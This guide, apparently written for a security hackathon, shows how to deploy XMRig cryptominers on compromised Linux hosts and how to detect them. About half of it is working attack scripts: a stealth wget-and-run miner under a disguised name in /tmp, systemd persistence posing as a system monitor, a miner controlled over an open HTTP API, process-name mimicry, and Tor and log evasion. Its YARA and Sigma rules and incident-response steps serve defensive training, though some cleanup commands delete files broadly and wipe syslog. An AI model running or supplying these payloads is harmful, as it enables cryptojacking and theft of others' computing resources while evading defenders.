# XMRig Hackathon Payload Crafting Guide

**OSCP Offensive Security Hackathon - Defensive Research Demonstration**
**Date:** 2025-10-02
**Binary Version:** XMRig 6.24.0

---

## Executive Summary

This guide demonstrates how to craft XMRig cryptocurrency miner payloads for **DEFENSIVE SECURITY TRAINING** purposes. The goal is to educate blue teams on real-world post-exploitation techniques used by threat actors for cryptojacking.

---

## Quick Start - Payload Deployment Scenarios

### Scenario 1: Stealthy Background Miner (Blue Team Detection Exercise)

**Use Case:** Train defenders to detect low-intensity cryptojacking

**Payload:**
```bash
#!/bin/bash
# Stealthy deployment script

BINARY="/tmp/.systemd-update"
CONFIG="/tmp/.config.json"
LOG="/dev/null"

# Download and rename binary
wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz
tar -xzf /tmp/xmrig.tar.gz -C /tmp/
mv /tmp/xmrig-6.24.0/xmrig ${BINARY}
rm -rf /tmp/xmrig.tar.gz /tmp/xmrig-6.24.0/

# Create stealth config
cat > ${CONFIG} <<'EOF'
{
    "autosave": false,
    "background": true,
    "colors": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 25,
        "priority": 0,
        "yield": true
    },
    "pools": [{
        "url": "pool.supportxmr.com:443",
        "user": "YOUR_WALLET_HERE",
        "pass": "x",
        "tls": true,
        "keepalive": true
    }],
    "log-file": null,
    "pause-on-active": 120,
    "print-time": 300
}
EOF

# Execute in background
nohup ${BINARY} -c ${CONFIG} > ${LOG} 2>&1 &

# Cleanup
rm -f /tmp/xmrig.tar.gz
```

**Detection Indicators for Blue Team:**
```bash
# CPU usage from unusual process
top -b -n 1 | grep -i systemd-update

# Network connection to mining pool
netstat -tunap | grep -E ":443.*ESTABLISHED" | grep systemd-update

# Process analysis
ps auxf | grep -E "systemd-update|xmrig"

# Check for hidden files
ls -la /tmp/ | grep "^\."
```

**Flags Explained:**
- `background: true`: Runs as daemon (no terminal attached)
- `max-threads-hint: 25`: Uses only 25% of CPU (stealthy)
- `priority: 0`: Idle priority (minimal impact)
- `pause-on-active: 120`: Pauses when user active for 2 minutes
- `url: pool.supportxmr.com:443`: Uses HTTPS port (blends with web traffic)
- `tls: true`: Encrypted communication (evades packet inspection)

---

### Scenario 2: Aggressive Server Exploitation

**Use Case:** Demonstrate maximum resource hijacking impact

**Payload:**
```bash
#!/bin/bash
# Aggressive mining deployment

INSTALL_DIR="/opt/.cache"
BINARY="${INSTALL_DIR}/java-updater"
CONFIG="${INSTALL_DIR}/config.json"

# Create hidden directory
mkdir -p ${INSTALL_DIR}

# Deploy binary (assuming already transferred)
cp /tmp/xmrig ${BINARY}
chmod +x ${BINARY}

# High-performance config
cat > ${CONFIG} <<'EOF'
{
    "autosave": false,
    "background": true,
    "colors": false,
    "randomx": {
        "mode": "fast",
        "1gb-pages": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "priority": 3,
        "max-threads-hint": 100,
        "yield": false
    },
    "pools": [{
        "url": "pool.minexmr.com:4444",
        "user": "YOUR_WALLET_HERE",
        "pass": "x",
        "keepalive": true,
        "tls": false
    }],
    "log-file": "/var/log/java-updater.log"
}
EOF

# Execute
${BINARY} -c ${CONFIG} &
```

**Flags Explained:**
- `mode: fast`: Uses more memory but faster (RandomX fast mode = ~2GB RAM)
- `1gb-pages: true`: Requires root, huge performance boost
- `priority: 3`: Higher than normal (aggressive)
- `max-threads-hint: 100`: Use ALL available CPU
- `yield: false`: Don't yield to other processes (maximum performance)

**Detection:** VERY easy (100% CPU usage)
**Performance:** Maximum hashrate

---

### Scenario 3: Persistent Botnet-Style Deployment

**Use Case:** Demonstrate persistence mechanisms for incident response training

**Payload with Systemd Persistence:**
```bash
#!/bin/bash
# Persistent deployment with systemd

INSTALL_DIR="/usr/local/lib/.systemd"
BINARY="${INSTALL_DIR}/systemd-monitor"
CONFIG="${INSTALL_DIR}/monitor.conf"
SERVICE_NAME="systemd-monitor"

# Create installation directory
mkdir -p ${INSTALL_DIR}

# Deploy binary
cp /tmp/xmrig ${BINARY}
chmod +x ${BINARY}

# Create config
cat > ${CONFIG} <<'EOF'
{
    "autosave": false,
    "background": false,
    "colors": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 50,
        "priority": 1
    },
    "pools": [{
        "url": "pool.supportxmr.com:3333",
        "user": "YOUR_WALLET_HERE",
        "pass": "x",
        "tls": true,
        "keepalive": true
    }],
    "log-file": "/var/log/systemd-monitor.log",
    "watch": true,
    "retries": 10,
    "retry-pause": 30
}
EOF

# Create systemd service
cat > /etc/systemd/system/${SERVICE_NAME}.service <<'EOF'
[Unit]
Description=System Resource Monitor
Documentation=https://systemd.io/MONITOR/
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=nobody
Group=nogroup
ExecStart=/usr/local/lib/.systemd/systemd-monitor -c /usr/local/lib/.systemd/monitor.conf
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

# Security hardening (ironically)
PrivateTmp=true
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl daemon-reload
systemctl enable ${SERVICE_NAME}.service
systemctl start ${SERVICE_NAME}.service

# Verify
systemctl status ${SERVICE_NAME}.service
```

**Persistence Detection for Blue Team:**
```bash
# List suspicious systemd services
systemctl list-unit-files | grep -v "vendor preset"

# Check recently modified services
find /etc/systemd/system -type f -mtime -7

# Analyze service file
systemctl cat systemd-monitor.service

# Check service resource usage
systemctl status systemd-monitor

# Disable malicious service
systemctl stop systemd-monitor.service
systemctl disable systemd-monitor.service
rm /etc/systemd/system/systemd-monitor.service
systemctl daemon-reload
```

---

### Scenario 4: Remote C2-Controlled Miner

**Use Case:** Demonstrate command-and-control capabilities for APT simulation

**Payload:**
```bash
#!/bin/bash
# C2-enabled miner deployment

BINARY="/usr/bin/update-notifier"
CONFIG="/etc/update-notifier.conf"

# Deploy
cp /tmp/xmrig ${BINARY}
chmod +x ${BINARY}

# C2-enabled config
cat > ${CONFIG} <<'EOF'
{
    "autosave": false,
    "background": true,
    "colors": false,
    "api": {
        "worker-id": "bot-001",
        "id": "hackathon-demo"
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 8080,
        "access-token": "SecretToken123",
        "restricted": false
    },
    "cpu": {
        "enabled": true,
        "max-threads-hint": 50
    },
    "pools": [{
        "url": "pool.supportxmr.com:3333",
        "user": "YOUR_WALLET_HERE",
        "pass": "x",
        "tls": true
    }],
    "log-file": null
}
EOF

# Start with C2 API
${BINARY} -c ${CONFIG} &

# Print C2 info
echo "C2 API listening on: http://$(hostname -I | awk '{print $1}'):8080"
echo "Access Token: SecretToken123"
```

**C2 Control Commands:**
```bash
# Set your variables
TARGET_IP="192.168.45.100"
TOKEN="SecretToken123"
API_URL="http://${TARGET_IP}:8080"

# Get miner status
curl -s "${API_URL}/2/summary" \
  -H "Authorization: Bearer ${TOKEN}" | jq .

# Pause mining
curl -s -X POST "${API_URL}/2/json/stop" \
  -H "Authorization: Bearer ${TOKEN}"

# Resume mining
curl -s -X POST "${API_URL}/2/json/start" \
  -H "Authorization: Bearer ${TOKEN}"

# Get full config
curl -s "${API_URL}/2/config" \
  -H "Authorization: Bearer ${TOKEN}" | jq .

# Update threads dynamically
curl -s -X POST "${API_URL}/2/json/config" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"cpu":{"max-threads-hint":25}}'

# Get backend info (CPU, GPU details)
curl -s "${API_URL}/2/backends" \
  -H "Authorization: Bearer ${TOKEN}" | jq .
```

**API Endpoints Reference:**
```
GET  /2/summary        - Current hashrate, pool status, uptime
GET  /2/backends       - CPU/GPU configuration details
GET  /2/config         - Full configuration dump
POST /2/json/start     - Resume mining
POST /2/json/stop      - Pause mining
POST /2/json/config    - Update configuration dynamically
```

---

## Advanced Evasion Techniques

### 1. Process Name Mimicry
```bash
# Mimic kernel worker threads (brackets confuse process viewers)
cp xmrig "/tmp/[kworker/0:1]"
/tmp/[kworker/0:1] -o pool.supportxmr.com:3333 -u WALLET &

# Mimic systemd processes
cp xmrig /usr/lib/systemd/systemd-logind
/usr/lib/systemd/systemd-logind -c config.json &
```

### 2. Traffic Obfuscation
```bash
# Route through Tor SOCKS5 proxy
./xmrig \
  -o pool.supportxmr.com:3333 \
  -u WALLET \
  -x socks5://127.0.0.1:9050 \
  -B

# Use DNS-over-HTTPS for pool resolution (harder to block)
./xmrig \
  -o pool.supportxmr.com:443 \
  --tls \
  --dns-ttl=600
```

### 3. Resource Throttling (Avoid Detection)
```bash
# Use cgroups to limit CPU (if root)
cgcreate -g cpu:/lowpriority
cgset -r cpu.shares=256 lowpriority
cgexec -g cpu:lowpriority ./xmrig -c config.json

# OR use nice/ionice
nice -n 19 ionice -c 3 ./xmrig -c config.json
```

### 4. Log Evasion
```bash
# Null logging
-l /dev/null

# Log to tmpfs (RAM, disappears on reboot)
-l /dev/shm/.log

# Log rotation to avoid disk filling
-l /tmp/miner.log --max-log-file-size=1048576  # 1MB max
```

---

## Blue Team Detection Lab

### Setup Detection Environment
```bash
#!/bin/bash
# Deploy detection tools

# 1. CPU monitoring with alerting
cat > /usr/local/bin/cpu_monitor.sh <<'EOF'
#!/bin/bash
THRESHOLD=70
while true; do
    CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    if (( $(echo "$CPU > $THRESHOLD" | bc -l) )); then
        echo "[ALERT] High CPU: ${CPU}%" | tee -a /var/log/cpu_alerts.log
        # Log top processes
        ps auxf --sort=-%cpu | head -20 >> /var/log/cpu_alerts.log
    fi
    sleep 30
done
EOF
chmod +x /usr/local/bin/cpu_monitor.sh

# 2. Network monitoring for mining pools
cat > /usr/local/bin/pool_detector.sh <<'EOF'
#!/bin/bash
# Common mining pool ports
PORTS="3333 4444 5555 7777 8888 9999 14444"
for PORT in ${PORTS}; do
    CONN=$(netstat -tunap 2>/dev/null | grep ":${PORT}")
    if [ -n "$CONN" ]; then
        echo "[ALERT] Mining pool connection detected on port ${PORT}"
        echo "$CONN" | tee -a /var/log/pool_alerts.log
    fi
done
EOF
chmod +x /usr/local/bin/pool_detector.sh

# 3. XMRig binary detection
find / -type f -executable -size +5M -exec sh -c '
    strings "{}" | grep -q "xmrig\|donate.v2.xmrig\|randomx" && echo "[ALERT] Potential XMRig binary: {}"
' \; 2>/dev/null

# 4. Suspicious process detection
ps auxf | grep -E "\[kworker\]|systemd-monitor|java-updater" | grep -v grep
```

### YARA Rules for Detection
```yara
rule Monero_Miner_XMRig_Binary {
    meta:
        description = "Detects XMRig cryptocurrency miner binary"
        author = "Blue Team"
        reference = "OSCP Hackathon 2025"
        severity = "HIGH"

    strings:
        // XMRig specific strings
        $xmrig1 = "donate.v2.xmrig.com" ascii
        $xmrig2 = "donate.ssl.xmrig.com" ascii
        $xmrig3 = "XMRig/" ascii

        // Mining related
        $pool1 = "pool_wallet" ascii
        $pool2 = "stratum+tcp://" ascii
        $algo1 = "randomx" nocase
        $algo2 = "cryptonight" nocase

        // Configuration keywords
        $cfg1 = "huge-pages" ascii
        $cfg2 = "max-threads-hint" ascii
        $cfg3 = "pause-on-active" ascii

    condition:
        uint32(0) == 0x464c457f and  // ELF header
        filesize > 5MB and filesize < 15MB and
        (
            2 of ($xmrig*) or
            (1 of ($pool*) and 1 of ($algo*) and 1 of ($cfg*))
        )
}

rule Monero_Miner_Config_File {
    meta:
        description = "Detects XMRig JSON configuration file"
        author = "Blue Team"

    strings:
        $json1 = "\"pools\":" ascii
        $json2 = "\"cpu\":" ascii
        $json3 = "\"huge-pages\"" ascii
        $json4 = "\"randomx\"" ascii
        $pool = /\"url\"\s*:\s*\"[^\"]+:(3333|4444|5555|7777|14444)\"/ ascii

    condition:
        3 of ($json*) and $pool
}
```

### Sigma Rules for SIEM
```yaml
title: XMRig Cryptocurrency Miner Process Execution
id: 4c2c2a8e-9f4a-4b3e-8d7f-6a5c9b8e7f6a
status: experimental
description: Detects execution of XMRig cryptocurrency miner
author: Blue Team
date: 2025/10/02
references:
    - https://github.com/xmrig/xmrig
logsource:
    category: process_creation
    product: linux
detection:
    selection_binary:
        CommandLine|contains:
            - 'xmrig'
            - '--url='
            - '--user='
            - '--donate-level='
    selection_pools:
        CommandLine|contains:
            - 'pool.supportxmr.com'
            - 'pool.minexmr.com'
            - 'mine.xmrpool.net'
            - ':3333'
            - ':4444'
    selection_flags:
        CommandLine|contains:
            - '--background'
            - '--max-threads-hint'
            - '--pause-on-active'
    condition: 1 of selection_*
falsepositives:
    - Legitimate cryptocurrency mining (rare in enterprise)
level: high
tags:
    - attack.resource_development
    - attack.t1496
```

---

## Incident Response Playbook

### Step 1: Detection & Triage
```bash
# Identify suspicious processes
ps auxf --sort=-%cpu | head -20

# Check network connections
netstat -tunap | grep -E "ESTABLISHED.*:(3333|4444|5555)"

# Memory analysis
free -h  # Check for unusual memory usage
cat /proc/meminfo | grep Huge  # Check huge pages allocation
```

### Step 2: Evidence Collection
```bash
# Capture process details
ps -p <PID> -o pid,ppid,user,cmd,start_time,etime,%cpu,%mem

# Dump process memory
gcore <PID>  # Creates core dump

# Network capture
tcpdump -i any -w /tmp/capture.pcap host <mining_pool_ip>

# Filesystem timeline
find / -type f -mtime -1 -ls > /tmp/recent_files.txt
```

### Step 3: Containment
```bash
# Kill process
kill -9 <PID>

# Block network
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 4444 -j DROP
iptables -A OUTPUT -d <pool_ip> -j DROP

# Remove persistence
systemctl stop <malicious_service>
systemctl disable <malicious_service>
rm /etc/systemd/system/<malicious_service>.service
crontab -l | grep -v xmrig | crontab -
```

### Step 4: Eradication
```bash
# Find and remove binaries
find / -type f -name "*xmrig*" -delete
find / -type f -executable | xargs strings | grep -l "donate.v2.xmrig.com" | xargs rm

# Remove configs
find / -name "*.json" | xargs grep -l "randomx" | xargs rm

# Clean logs
> /var/log/syslog
```

### Step 5: Recovery & Hardening
```bash
# Update systems
apt update && apt upgrade -y

# Implement monitoring
# (Deploy cpu_monitor.sh and pool_detector.sh from above)

# Harden configurations
echo "* hard nproc 100" >> /etc/security/limits.conf
echo "* hard cpu 80" >> /etc/security/limits.conf
```

---

## Hackathon Demonstration Outline

### Part 1: Attack Demonstration (15 min)
1. **Initial Access** (simulated web shell upload)
2. **Download XMRig** via wget
3. **Configure stealth payload**
4. **Deploy with systemd persistence**
5. **Verify mining activity**
6. **Show remote C2 control**

### Part 2: Detection Demonstration (15 min)
1. **CPU spike detection**
2. **Network traffic analysis**
3. **Process tree analysis**
4. **YARA scanning**
5. **Log correlation**

### Part 3: Response Demonstration (10 min)
1. **Incident triage**
2. **Evidence collection**
3. **Containment actions**
4. **Eradication steps**
5. **Post-incident hardening**

---

## Tools & Resources

### Detection Tools
- **YARA:** Binary pattern matching
- **osquery:** Endpoint visibility
- **auditd:** Process auditing
- **Zeek/Suricata:** Network traffic analysis
- **Sysmon:** Windows event logging (for cross-platform)

### Analysis Tools
- **strings:** Extract readable strings from binary
- **ltrace/strace:** Trace library/system calls
- **gdb:** Debug and analyze binary
- **Volatility:** Memory forensics
- **Wireshark:** Packet analysis

### Mining Pool Lists (for blocking)
```
pool.supportxmr.com
pool.minexmr.com
xmr.pool.minergate.com
mine.xmrpool.net
pool.usxmrpool.com
monerohash.com
moneroocean.stream
```

---

## Educational Outcomes

### Offensive Skills
- Post-exploitation payload deployment
- Persistence mechanism implementation
- Evasion technique application
- C2 infrastructure setup

### Defensive Skills
- Cryptominer detection methodologies
- Network traffic analysis
- Behavioral analysis techniques
- Incident response procedures
- YARA/Sigma rule creation

### Exam Relevance (OSCP)
- **Time Management:** 20-minute deployment scenario
- **Methodology:** Structured attack chain
- **Documentation:** Complete payload documentation
- **Alternative Approaches:** Multiple persistence methods

---

## Legal & Ethical Reminder

**THIS IS FOR AUTHORIZED SECURITY RESEARCH ONLY**

✅ **Allowed:**
- Personal lab environments
- Authorized penetration tests (written permission)
- Defensive security training
- Controlled demonstrations

❌ **Prohibited:**
- Unauthorized system access
- Deployment on production systems without permission
- Any illegal cryptojacking activity

**Always obtain explicit written authorization before deploying mining payloads.**

---

## Summary

XMRig provides an excellent platform for demonstrating:
- Real-world post-exploitation techniques
- Cryptojacking attack methodologies
- Detection and response capabilities
- Blue team training scenarios

This hackathon payload demonstrates the full attack lifecycle from deployment to detection to response, providing comprehensive learning for both red and blue team perspectives.

**End Goal:** Educate security professionals on cryptojacking threats and defenses through hands-on demonstration.
